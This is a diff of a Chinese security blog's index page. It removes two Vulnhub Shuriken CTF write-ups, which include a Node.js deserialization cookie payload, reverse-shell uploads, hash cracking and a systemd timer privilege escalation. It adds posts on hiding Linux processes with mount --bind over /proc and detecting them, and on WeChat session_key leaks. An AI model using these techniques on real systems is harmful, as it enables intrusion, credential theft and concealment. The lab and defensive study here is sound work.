+<p>[4] <a target="_blank" rel="noopener" href="https://github.com/I5N0rth/CVE-2023-33246">https://github.com/I5N0rth/CVE-2023-33246</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p>
 </blockquote>
 
 
@@ -477,7 +655,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
@@ -488,94 +666,58 @@
 
     
         <h2 class="title">
-            <a href="/2022/08/24/Shuriken-Node/">
-                Shuriken Node
+            <a href="/2023/09/02/Process-Hide/">
+                Linux当中如何隐藏和查看进程
             </a>
         </h2>
     
     <time>
-        Aug 24, 2022
+        Sep 2, 2023
     </time>
     <section class="content">
-        <h1><span id="shuriken-node">SHURIKEN: NODE</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shuriken-node">名称：Shuriken: Node</span></h4><h4><span id="发布日期20201213">发布日期：2020.12.13</span></h4><h4><span id="作者thecyb3rw0lf">作者：TheCyb3rW0lf</span></h4><h4><span id="系列shuriken">系列：Shuriken</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>serv-adm:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度困难">难度：困难</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shuriken_nodeova">文件名：Shuriken_Node.ova</span></h4><h4><span id="文件大小25gb">文件大小：2.5GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshurikenshuriken_nodeova">下载地址：</span></h4><h4><span id="md5-5eefc9733f218d3eb5e96ca231204bac">MD5: 5EEFC9733F218D3EB5E96CA231204BAC</span></h4><h4><span id="sha1-be48eb2ce8b9faa6c016bae4776869f873f6b2b9">SHA1: BE48EB2CE8B9FAA6C016BAE4776869F873F6B2B9</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shuriken_node和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shuriken-Node/1.png" alt="image-"></p>
+        <h1><span id="linux当中如何隐藏和查看进程">Linux当中如何隐藏和查看进程</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/zfw_666666/article/details/126658093">CN-FuWei</a> 并作补充</p>
 </blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和8080端口，访问8080，查看源码没有什么线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.125 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-Node/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，也没有过多线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.125:8080 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/6.png" alt="image-"></p>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>进程是执行程序的过程，类似于按照图纸，真正去盖房子的过程。</p>
+<p>同一个程序可以执行多次，每次都可以在内存中开辟独立的空间来装载，从而产生多个进程。不同的进程还可以拥有各自独立的IO接口。操作系统的一个重要功能就是为进程提供方便，比如说为进程分配内存空间，管理进程的相关信息等等，就好像是为我们准备好了一个精美的地址。</p>
+<p>进程信息是proc目录下动态生成，每个动态创建的进程ID号下面详细的记录了关于该进程的fd,mem,io,cpuset等进程信息。</p>
+<p>Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。</p>
+<p><strong>通过它可以访问系统内核数据。</strong>用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。</p>
+<p>由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统动态的。在&#x2F;proc下还有三个很重要的目录：net，scsi和sys。sys目录是可写的，可以通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。例如，如果系统不支持scsi，则scsi 目录不存在。</p>
+<p>除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口。</p>
+<p>读取&#x2F;proc&#x2F;self&#x2F;maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</p>
 </blockquote>
-<h3><span id="nodejs漏洞利用">Node.js漏洞利用</span></h3><blockquote>
-<p>1.根据主页提示，我们需要关注Node.js相关的问题，在exploit-db查询node.js相关的漏洞（<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41289%EF%BC%89%EF%BC%9A">https://www.exploit-db.com/exploits/41289）：</a></p>
-<p><img src="/2022/08/24/Shuriken-Node/7.png" alt="image-"></p>
-<p>2.根据漏洞文档描述，我们在<a target="_blank" rel="noopener" href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py%E4%B8%8B%E8%83%BD%E5%A4%9F%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%9C%A8kali%E4%B8%8A%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%8B%EF%BC%9A">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py下能够找到利用程序，在kali上获取一下：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/8.png" alt="image-"></p>
-<p>3.利用nodejsshell.py生成设定的ip和端口的shellcode，根据漏洞文档描述，要将shellcode加载后进行base64编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python nodejsshell.py 192.168.56.102 9002</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/9.png" alt="image-"></p>
-<p>4.利用漏洞文档提供的加载器，再在<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/%E4%B8%8A%E8%BF%9B%E8%A1%8Cbase64%E8%BD%AC%E6%8D%A2%E5%90%8E%EF%BC%8Ckali%E7%9B%91%E5%90%AC%E5%AF%B9%E5%BA%94%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%8A%8Apayload%E6%B3%A8%E5%85%A5%E5%88%B0cookie%E4%B8%AD%EF%BC%9A">https://gchq.github.io/CyberChef/上进行base64转换后，kali监听对应端口，把payload注入到cookie中：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#125;()&quot;&#125;，加载器</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/10.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-Node/11.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-Node/12.png" alt="image-"></p>
+<h2><span id="一-隐藏进程">一、隐藏进程</span></h2><blockquote>
+<p>利用mount —bind 将另外一个目录挂载覆盖至&#x2F;proc&#x2F;目录下指定进程ID的目录，我们知道ps、top等工具会读取&#x2F;proc目录下获取进程信息，如果将进程ID的目录信息覆盖，则原来的进程信息将从ps的输出结果中隐匿。</p>
+<p>比如当前有一个minio进程（pid：1945）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@docker]-[~]-ps -ef|grep minio</span><br><span class="line">root       1945   1924  0 08:06 ?        00:00:10 minio server /data --console-address 0.0.0.0:9999</span><br></pre></td></tr></table></figure>
+
+<p>现在我们将该进程隐藏：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先，创建一个空目录（无任何挂载）</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /empty/dir</span><br><span class="line"><span class="comment">#将空目录进行挂载</span></span><br><span class="line">mount -o <span class="built_in">bind</span> /empty/dir/ /proc/1945</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们再来查询看看进程是否隐藏：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@docker]-[~]-<span class="comment">#ps -ef|grep minio</span></span><br><span class="line">root      46358  32804  0 10:54 pts/0    00:00:00 grep --color=auto minio</span><br></pre></td></tr></table></figure>
+
+<p>发现，进程已经被我们隐藏掉了。</p>
 </blockquote>
-<h3><span id="ssh免密登录初步提权">SSH免密登录，初步提权</span></h3><blockquote>
-<p>1.注入cookie后，我们就获得了shell，利用python构建交互式shell：</p>
-<p><img src="/2022/08/24/Shuriken-Node/13.png" alt="image-"></p>
-<p>2.查看文件权限，发现&#x2F;var&#x2F;backups目录下有ssh-backup.zip文件，解压后得到一个id_rsa：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la /var/backups</span><br><span class="line">unzip ssh-backup.zip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/14.png" alt="image-"></p>
-<p>3.我们在&#x2F;home目录下能够再发现serv-adm用户，这个密钥很可能就是该用户的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/15.png" alt="image-"></p>
-<p>4.id_rsa是一个加密了的密钥，我们把它复制到kali，利用ssh2john进行解密后ssh登录serv-adm：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim id_rsa.enc</span><br><span class="line">/usr/share/john/ssh2john.py id_rsa.enc &gt; id_rsa.hash</span><br><span class="line">john --wordlist=rockyou.txt id_rsa.hash</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/16.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in id_rsa.enc -out id_rsa，pasword是刚才john解出的密码</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line"></span><br><span class="line">ssh serv-adm@192.168.56.125 -i id_rsa</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/17.png" alt="image-"></p>
+<h2><span id="二-隐藏进程侦查">二、隐藏进程侦查</span></h2><h3><span id="21-方式一mounts">2.1 方式一（mounts）</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@docker]-[/proc]-<span class="comment">#cat /proc/mounts </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/02/Process-Hide/1.png" alt="image"></p>
 </blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.在ser-adm用户目录下，能够发现第一个flag，user.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/18.png" alt="image-"></p>
-<p>2.利用sudo -l命令查看文件权限，发现有定时文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/19.png" alt="image-"></p>
-<p>3.我们查看一下shuriken-auto.timer，发现他定时执行shuriken-job.service，我们可以修改job为我们需要的提权程序：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/systemd/system</span><br><span class="line">ls -la</span><br><span class="line">cat shuriken-auto.timer</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/20.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano shuriken-job.service</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/21.png" alt="image-"></p>
+<h3><span id="22-方式二sysdig">2.2 方式二（sysdig）</span></h3><blockquote>
+<p>下载安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://s3.amazonaws.com/download.draios.com/stable/install-sysdig | sudo bash</span><br><span class="line"></span><br><span class="line">[root@docker]-[~]-<span class="comment">#sysdig -c topprocs_cpu</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/02/Process-Hide/2.png" alt="image"></p>
 </blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们能重启一下时间器，获得用于提权的bashroot，执行触发获得root权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop shuriken-auto.timer</span><br><span class="line">sudo systemctl start shuriken-auto.timer</span><br><span class="line">/tmp/bashroot -p</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/22.png" alt="image-"></p>
-<p>2.在&#x2F;root目录下能够发现第二个flag，root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/23.png" alt="image-"></p>
+<h3><span id="23-方式三unhide">2.3 方式三（unhide）</span></h3><blockquote>
+<p>下载安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install unhide</span><br></pre></td></tr></table></figure>
+
+<p>暴力扫描隐藏进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unhide checkbrute</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/02/Process-Hide/3.png" alt="image"></p>
 </blockquote>
 
 
@@ -583,7 +725,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Shuriken/" rel="tag">Shuriken</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Process/" rel="tag">Process</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
@@ -594,101 +736,54 @@
 
     
         <h2 class="title">
-            <a href="/2022/08/24/Shuriken-1/">
-                Shuriken 1
+            <a href="/2023/09/02/WeChat-Session-Key/">
+                安全课堂｜关于小程序session_key泄露漏洞
             </a>
         </h2>
     
     <time>
-        Aug 24, 2022
+        Sep 2, 2023
     </time>
     <section class="content">
-        <h1><span id="shuriken-1">SHURIKEN: 1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shuriken-1">名称：Shuriken: 1</span></h4><h4><span id="发布日期20201113">发布日期：2020.11.13</span></h4><h4><span id="作者thecyb3rw0lf">作者：TheCyb3rW0lf</span></h4><h4><span id="系列shuriken">系列：Shuriken</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>server-management:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shuriken-1ova">文件名：Shuriken-1.ova</span></h4><h4><span id="文件大小27gb">文件大小：2.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshurikenshuriken-1ova">下载地址：</span></h4><h4><span id="md5-2db75b09a1dd917ffe1df20b4450d032">MD5: 2DB75B09A1DD917FFE1DF20B4450D032</span></h4><h4><span id="sha1-602f049006afe12632a1b6feb6e4860008c96d32">SHA1: 602F049006AFE12632A1B6FEB6E4860008C96D32</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shuriken和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shuriken-1/1.png" alt="image-"></p>
+        <h1><span id="安全课堂关于小程序session_key泄露漏洞">安全课堂｜关于小程序session_key泄露漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/community/minihome/doc/000806202400280b0edd5866156c01?blockType=99">微信团队</a> 并作补充</p>
+<p>为进一步提升小程序的安全性和用户体验，目前平台对提审的小程序均需进行安全检测，在检测过程中发现仍有许多小程序存在安全漏洞，其中涉及session_key泄露漏洞，希望通过以下相关的漏洞介绍、案例分析和修复建议，开发者能更加了解如何对该漏洞进行防御。</p>
 </blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了80和8080端口，访问主页，查看源代码sha384字串无法解码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.124 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现&#x2F;sercet目录比较可疑：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.124 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/6.png" alt="image-"></p>
+<h2><span id="一-漏洞介绍">一、漏洞介绍</span></h2><blockquote>
+<p>为了保证数据安全，微信会对用户数据进行加密传输处理，所以小程序在获取微信侧提供的用户数据（如手机号）时，就需要进行相应的解密，这就会涉及到session_key，具体流程可参考开放数据校验与解密开发文档。</p>
+<p>session_key指的是会话密钥，可以简单理解为微信开放数据AES加密的密钥，它是微信服务器给开发者服务器颁发的身份凭证，这个数据正常来说是不能通过任何方式泄露出去的。小程序若存在session_key泄露漏洞的情况，则代表微信侧传递的用户数据有被泄露、篡改等风险，开发者应及时发现该漏洞并快速修复相应问题。</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/1.png" alt="image"></p>
 </blockquote>
-<h3><span id="clipbucket页登录">ClipBucket页登录</span></h3><blockquote>
-<p>1.访问&#x2F;secret目录，发现一张secret.png图片，对图片进行信息隐藏分析后没有额外结果：</p>
-<p><img src="/2022/08/24/Shuriken-1/7.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/8.png" alt="image-"></p>
-<p>2.于是根据图片提示去主页查看js代码，发现两个指向：</p>
-<p><img src="/2022/08/24/Shuriken-1/9.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/10.png" alt="image-"></p>
-<p>3.修改kali的&#x2F;etc&#x2F;hosts文件，访问<a href="http://broadcast.shuriken.local，发现需要用户名和密码：">http://broadcast.shuriken.local，发现需要用户名和密码：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/11.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/12.png" alt="image-"></p>
-<p>4.再次修改&#x2F;etc&#x2F;hosts，通过<a target="_blank" rel="noopener" href="http://shuriken.local/index.php?referer=%E8%AF%B7%E6%B1%82%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0apache%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/etc/apache2/sites-enabled/000-default.conf%EF%BC%8C%E8%AF%A5%E6%96%87%E4%BB%B6%E6%8C%87%E6%98%8E%E7%94%A8%E6%88%B7%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE%E4%B8%BA/etc/apach2/.htpasswd%EF%BC%9A">http://shuriken.local/index.php?referer=请求可以得到apache默认配置文件/etc/apache2/sites-enabled/000-default.conf，该文件指明用户文件位置为/etc/apach2/.htpasswd：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/13.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/14.png" alt="image-"></p>
-<p>5.继续读取&#x2F;etc&#x2F;apach2&#x2F;.htpasswd，可以得到用户名和密码的字串，利用hashcat结合rockyou字典破解密码：</p>
-<p><img src="/2022/08/24/Shuriken-1/15.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0&#x27; &gt; hash.txt</span><br><span class="line">hashcat -m 1600 -a 0 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/16.png" alt="image-"></p>
+<h2><span id="二-漏洞案例">二、漏洞案例</span></h2><blockquote>
+<p>某小程序因为session_key泄露，导致该小程序可以使用任意手机号进行登录，造成了极大的安全风险。</p>
+<p>我们可以很明显地看到，下列请求中的session_key已经被泄露：</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/2.png" alt="image"></p>
+<p>通过获取该session_key，我们可以结合iv解密出密文：</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/3.png" alt="image"></p>
+<p>只需如下脚本即可进行解密，所以攻击者也可利用同样的信息去篡改用户数据，然后加密后返回给服务器，从而达到使用任意手机号进行登录的目的。</p>
+<p><img src="/2023/09/02/WeChat-Session-Key/4.png" alt="image"></p>
 </blockquote>
-<h3><span id="clipbucket漏洞利用">ClipBucket漏洞利用</span></h3><blockquote>
-<p>1.再次修改&#x2F;etc&#x2F;hosts，回到<a target="_blank" rel="noopener" href="http://broadcast.shuriken.local,登录后发现是clipbucket的页面,可以在exploit-db上找到相关的漏洞利用(https//www.exploit-db.com/exploits/44250%EF%BC%89%EF%BC%9A">http://broadcast.shuriken.local，登录后发现是ClipBucket的页面，可以在exploit-db上找到相关的漏洞利用（https://www.exploit-db.com/exploits/44250）：</a></p>
-<p><img src="/2022/08/24/Shuriken-1/17.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/18.png" alt="image-"></p>
-<p>2.构造payload后，对kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php进行修改，在kali开启对应端口监听，访问<a target="_blank" rel="noopener" href="http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1630302014b9d72e.php%E5%90%8E%E6%88%90%E5%8A%9F%E8%8E%B7%E5%BE%97shell%EF%BC%8C%E5%86%8D%E7%94%A8python%E6%9E%84%E5%BB%BA%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%EF%BC%9A">http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1630302014b9d72e.php后成功获得shell，再用python构建交互式shell：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/19.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br><span class="line">curl --basic --user &quot;developers:9972761drmfsls&quot; -F &quot;file=@php-reverse-shell.php&quot; -F &quot;plupload=1&quot; -F &quot;name=anyname.php&quot;  http://broadcast.shuriken.local/actions/beats_uploader.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/20.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/21.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/22.png" alt="image-"></p>
+<h2><span id="三-漏洞修复">三、漏洞修复</span></h2><blockquote>
+<p>通过上述案例，我们了解到session_key泄露会对小程序造成的危害，而导致session_key泄露的原因则可能有以下两种：</p>
